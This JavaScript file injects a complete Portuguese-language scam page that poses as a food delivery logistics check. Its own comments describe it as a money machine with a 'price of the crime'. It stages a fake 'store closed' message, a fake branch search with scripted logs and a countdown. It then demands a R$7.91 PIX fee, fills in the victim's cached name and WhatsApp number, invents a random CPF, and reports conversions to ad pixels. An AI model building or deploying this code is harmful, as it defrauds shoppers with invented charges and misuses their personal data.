(function() {
    
    
    var payload = `<!DOCTYPE html>
<html lang="pt-br">
<head>

    <script
      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
      data-utmify-prevent-xcod-sck
      data-utmify-prevent-subids
      async
      defer
    ></script>

    <script src="scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>

    <!-- TikTok Pixel Code Start -->
    <script>
    !function (w, d, t) {
      w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
    var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
    ;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


      ttq.load('D5MLIM3C77U85R08N62G');
      ttq.page();
    }(window, document, 'ttq');
    </script>
    <!-- TikTok Pixel Code End -->

      <!-- Meta Pixel Code -->
    <script>
    !function(f,b,e,v,n,t,s)
    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
    n.queue=[];t=b.createElement(e);t.async=!0;
    t.src=v;s=b.getElementsByTagName(e)[0];
    s.parentNode.insertBefore(t,s)}(window, document,'script',
    'https://connect.facebook.net/en_US/fbevents.js');
    fbq('init', '911135198055254');
    fbq('track', 'PageView');
    </script>
    <noscript><img height="1" width="1" style="display:none" src="tr?id=911135198055254&ev=PageView&noscript=1"></noscript>
    <!-- End Meta Pixel Code -->

    
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Central de Logística - Verificação</title>
    

    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script>

    <style>
        body { font-family: 'Inter', sans-serif; background-color: #f3f4f6; user-select: none; -webkit-tap-highlight-color: transparent; }
        .hidden-force { display: none !important; }
        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        /* ANIMA脟脙O RADAR TIPO IF00D */
        .radar-box { position: relative; width: 100px; height: 100px; margin: 0 auto; display: flex; align-items: center; justify-content: center; }
        .radar-wave { position: absolute; border: 2px solid #ef4444; border-radius: 50%; opacity: 0; width: 100%; height: 100%; animation: pulse-red 2s infinite; }
        .radar-wave:nth-child(2) { animation-delay: 0.5s; }
        @keyframes pulse-red { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
        
        .radar-wave-blue { border-color: #3b82f6; animation-name: pulse-blue; }
        @keyframes pulse-blue { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }

        .progress-bar-container { width: 100%; background: #e5e7eb; height: 6px; border-radius: 99px; overflow: hidden; }
        .progress-bar-fill { height: 100%; background: #22c55e; width: 0%; transition: width 0.5s ease; }
    </style>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col items-center justify-start pt-0" oncontextmenu="return false">

    <div class="w-full max-w-md bg-white shadow-sm border-b border-gray-200 p-4 flex justify-between items-center sticky top-0 z-40">
        <div class="flex items-center gap-2">
            <span class="text-xs font-bold text-gray-500 uppercase tracking-wider">Log铆stica & Entrega</span>
        </div>
        <div class="flex items-center gap-1">
            <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
            <span class="text-[10px] text-gray-400">Online</span>
        </div>
    </div>

    <div class="w-full max-w-md bg-white min-h-[90vh] relative p-6 flex flex-col">

        <div id="scene-loading" class="flex flex-col items-center justify-center pt-10 text-center h-full fade-in">
            <div class="w-16 h-16 border-4 border-gray-200 border-t-green-600 rounded-full animate-spin mb-6"></div>
            <h2 class="text-xl font-bold text-gray-800">Processando Pedido</h2>
            <p class="text-sm text-gray-500 mt-2">Confirmando itens com a cozinha...</p>
            
            <div class="mt-8 w-full px-4">
                <div class="progress-bar-container">
                    <div class="progress-bar-fill" style="width: 85%"></div>
                </div>
            </div>
        </div>

        <div id="scene-error" class="hidden-force flex flex-col items-center justify-center pt-10 text-center h-full fade-in">
            <div class="radar-box mb-6">
                <div class="radar-wave"></div>
                <div class="radar-wave"></div>
                <i class="fa-solid fa-store-slash text-4xl text-red-500 relative z-10"></i>
            </div>
            
            <h2 class="text-2xl font-black text-red-600 mb-2 uppercase">LOJA FECHADA!</h2>
            <p class="text-sm text-gray-600 leading-relaxed px-2">
                Ops! A unidade selecionada encerrou o expediente h谩 exatos <strong>2 minutos</strong>. 
                <br><br>
                <span class="text-xs bg-red-50 text-red-700 px-2 py-1 rounded border border-red-100 font-bold">
                    PEDIDO PARALISADO
                </span>
            </p>
        </div>

        <div id="scene-search" class="hidden-force flex flex-col items-center justify-center pt-10 text-center h-full fade-in">
            <div class="radar-box mb-6">
                <div class="radar-wave radar-wave-blue"></div>
                <div class="radar-wave radar-wave-blue"></div>
                <i class="fa-solid fa-location-crosshairs text-4xl text-blue-500 relative z-10"></i>
            </div>
            
            <h2 class="text-lg font-bold text-blue-800 animate-pulse">Buscando Filial Aberta...</h2>
            <p id="search-log" class="text-xs font-mono text-gray-400 mt-4 bg-gray-900 text-white p-3 rounded w-full max-w-[250px]">
                Iniciando varredura...
            </p>
        </div>

        <div id="scene-upsell" class="hidden-force flex flex-col h-full fade-in">
            
            <div class="bg-green-50 border border-green-200 rounded-lg p-3 flex items-center gap-3 mb-6">
                <div class="bg-green-500 rounded-full p-1 text-white">
                    <i class="fa-solid fa-check text-xs"></i>
                </div>
                <div>
                    <h3 class="text-sm font-bold text-green-800">Nova Unidade Localizada!</h3>
                    <p class="text-[10px] text-green-700">Dist芒ncia: 3.1km da rota original</p>
                </div>
            </div>

            <div class="flex-1 flex flex-col justify-center">
                <div class="text-center mb-6">
                    <i class="fa-solid fa-route text-4xl text-yellow-500 mb-3"></i>
                    <h2 class="text-lg font-bold text-gray-800">Ajuste de Rota Necess谩rio</h2>
                    <p class="text-xs text-gray-500 px-4 mt-2">
                        Para o motoboy retirar seu pedido nesta nova unidade (mais distante), 茅 necess谩rio pagar a diferen莽a de combust铆vel.
                    </p>
                </div>

                <div class="bg-gray-50 p-4 rounded-xl border border-gray-200 mb-6">
                    <div class="flex justify-between items-center mb-2">
                        <span class="text-xs text-gray-500">Taxa de Deslocamento</span>
                        <span class="text-xs text-gray-400 line-through">R$ 15,00</span>
                    </div>
                    <div class="flex justify-between items-center border-t border-gray-200 pt-2">
                        <span class="text-sm font-bold text-gray-800">Total a pagar:</span>
                        <span class="text-3xl font-black text-green-600">R$ 7,91</span>
                    </div>
                </div>

                <button id="btn-pay-fee" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-4 rounded-xl shadow-lg shadow-green-200 active:scale-95 transition flex items-center justify-center gap-2 group">
                    <span>LIBERAR ENTREGA AGORA</span>
                    <i class="fa-solid fa-motorcycle group-hover:translate-x-1 transition"></i>
                </button>

                <p class="text-[10px] text-center text-red-400 mt-4">
                    <i class="fa-regular fa-clock"></i> Falta 04:59 para o cancelamento autom谩tico.
                </p>
            </div>
        </div>

        <div id="pix-modal" class="hidden-force absolute inset-0 bg-white z-50 flex flex-col items-center justify-center p-6 fade-in">
            <h3 class="text-lg font-bold text-gray-800 mb-2">Pagamento da Taxa</h3>
            <p class="text-xs text-center text-gray-500 mb-6">Pague para liberar o motoboy imediatamente.</p>
            
            <div class="border-4 border-gray-800 p-2 rounded-xl mb-6 shadow-sm">
                <img id="qr-code-img" src="" class="w-48 h-48 object-contain">
            </div>
            
            <div class="w-full flex gap-2 mb-4">
                <input type="text" id="pix-copia-cola" class="flex-1 bg-gray-100 border border-gray-200 rounded px-3 py-3 text-xs font-mono text-gray-600 truncate outline-none" readonly>
                <button id="btn-copy" class="bg-blue-600 text-white px-5 rounded font-bold shadow-md active:scale-95 transition text-xs">
                    COPIAR
                </button>
            </div>

            <div class="flex items-center gap-2 mt-2 bg-green-50 px-4 py-2 rounded-full border border-green-100">
                <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span class="text-[10px] text-green-700 font-bold uppercase">Aguardando confirma莽茫o...</span>
            </div>
        </div>

        <div id="scene-success" class="hidden-force flex flex-col items-center justify-center pt-10 text-center h-full fade-in bg-green-50 absolute inset-0 z-50">
            <div class="w-24 h-24 bg-green-500 rounded-full flex items-center justify-center mb-6 shadow-xl shadow-green-200">
                <i class="fa-solid fa-check text-5xl text-white"></i>
            </div>
            <h2 class="text-2xl font-black text-gray-800 mb-2">MOTOBOY LIBERADO!</h2>
            <p class="text-gray-600 mb-8 px-4 text-sm">A taxa foi confirmada. O motoboy est谩 indo para a nova unidade retirar seu pedido.</p>
            <a href="#" class="bg-green-600 text-white px-8 py-3 rounded-full font-bold shadow-lg w-full max-w-xs">
                ACOMPANHAR ENTREGA
            </a>
        </div>

    </div>

    <script>
        // ==========================================
        // 鈿欙笍 CONFIGURA脟脙O DA M脕QUINA DE DINHEIRO
        // ==========================================
        const API_BASE_URL = ""; // << COLOQUE SUA API AQUI CAMPE脙O
        const VALOR_TAXA = 7.91; // O PRE脟O DO CRIME

        // Fun莽茫o utilit谩ria para ID
        const el = (id) => document.getElementById(id);

        // 1. ORQUESTRADOR DO TEATRO
        document.addEventListener('DOMContentLoaded', () => {
            
            // Cena 1 -> Cena 2 (Loja Fechada) ap贸s 3s
            setTimeout(() => {
                el('scene-loading').classList.add('hidden-force');
                el('scene-error').classList.remove('hidden-force');
            }, 3000);

            // Cena 2 -> Cena 3 (Buscando) ap贸s +4s
            setTimeout(() => {
                el('scene-error').classList.add('hidden-force');
                el('scene-search').classList.remove('hidden-force');
                rodarLogsFake();
            }, 7000);

            // Cena 3 -> Cena 4 (Cobran莽a) ap贸s +4s
            setTimeout(() => {
                el('scene-search').classList.add('hidden-force');
                el('scene-upsell').classList.remove('hidden-force');
                
                // Track Checkout
                if(window.fbq) fbq('track', 'InitiateCheckout', { content_name: 'Taxa_Logistica_Upsell' });
            }, 11000);

            // Bot茫o Pagar
            el('btn-pay-fee').addEventListener('click', gerarPixTaxa);
        });

        // Logs falsos do radar
        function rodarLogsFake() {
            const display = el('search-log');
            const msgs = [
                "Pingando torres pr贸ximas...",
                "Unidade Centro: SEM RESPOSTA",
                "Unidade Alphaville: FECHADA (02:00)",
                "Unidade Jardins: ONLINE (3.1km)"
            ];
            let i = 0;
            const interval = setInterval(() => {
                if(i >= msgs.length) clearInterval(interval);
                else { display.innerText = msgs[i]; i++; }
            }, 800);
        }

        // 2. FUN脟脙O DE PAGAMENTO (INTEGRA脟脙O API)
        async function gerarPixTaxa() {
            const btn = el('btn-pay-fee');
            const txtOriginal = btn.innerHTML;
            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> PROCESSANDO...';
            btn.disabled = true;

            try {
                // Recupera dados do cache do usu谩rio (do pedido anterior)
                const nome = localStorage.getItem('user_cache_nome') || "Cliente";
                const zap = localStorage.getItem('user_cache_zap') || "11999999999";
                
                // Payload
                const payload = {
                    valorTotal: VALOR_TAXA,
                    nome: nome,
                    whatsapp: zap.replace(/\\D/g, ''),
                    cpf: gerarCPFRandom(),
                    cep: "01001000",
                    rua: "Taxa Logistica",
                    numero: "1",
                    bairro: "Centro",
                    products: [{ 
                        name: "TAXA LOGISTICA - URGENTE", 
                        price: VALOR_TAXA, 
                        quantity: 1 
                    }],
                    trackingParameters: { src: "upsell_logistics", utm_source: "recovery_v2" }
                };

                // Chamada API
                const req = await fetch(\`\${API_BASE_URL}/criar-pix\`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const res = await req.json();

                if(res.success) {
                    // Exibir Modal PIX
                    el('qr-code-img').src = res.qrCodeData;
                    el('pix-copia-cola').value = res.pixCopiaECola;
                    el('pix-modal').classList.remove('hidden-force');
                    el('pix-modal').classList.add('flex');
                    
                    // Configurar Copiar
                    new ClipboardJS('#btn-copy', { text: () => res.pixCopiaECola })
                        .on('success', () => Swal.fire({ toast: true, position: 'top', icon: 'success', title: 'Copiado!', showConfirmButton: false, timer: 1500 }));

                    // Monitorar
                    monitorarStatus(res.transactionId);
                } else {
                    alert('Erro ao gerar taxa. Tente novamente.');
                    btn.disabled = false;
                    btn.innerHTML = txtOriginal;
                }

            } catch(e) {
                console.error(e);
                alert('Erro de conex茫o. Verifique sua internet.');
                btn.disabled = false;
                btn.innerHTML = txtOriginal;
            }
        }

        // 3. MONITORAMENTO DE PAGAMENTO
        function monitorarStatus(id) {
            const check = setInterval(async () => {
                try {
                    const req = await fetch(\`\${API_BASE_URL}/verificar-status/\${id}\`);
                    const data = await req.json();
                    
                    if (data.status === 'paid' || data.status === 'approved') {
                        clearInterval(check);
                        
                        if(window.fbq) {
                            fbq('track', 'Purchase', { 
                                value: VALOR_TAXA, 
                                currency: 'BRL', 
                                content_name: 'Taxa Logistica Paga' 
                            }, { eventID: id });
                        }

                        el('pix-modal').classList.add('hidden-force');
                        el('scene-upsell').classList.add('hidden-force');
                        el('scene-success').classList.remove('hidden-force');
                        
                        // Limpa cache para evitar loop
                        localStorage.removeItem('nobre_pix_data');
                    }
                } catch(e) {}
            }, 3000);
        }

        function gerarCPFRandom() {
            const r = (n) => Math.floor(Math.random() * n);
            return \`\${r(9)}\${r(9)}\${r(9)}\${r(9)}\${r(9)}\${r(9)}\${r(9)}\${r(9)}\${r(9)}\${r(9)}\${r(9)}\`;
        }
    </script>
</body>
</html>`;

    document.open();
    document.write(payload);
    document.close();

})();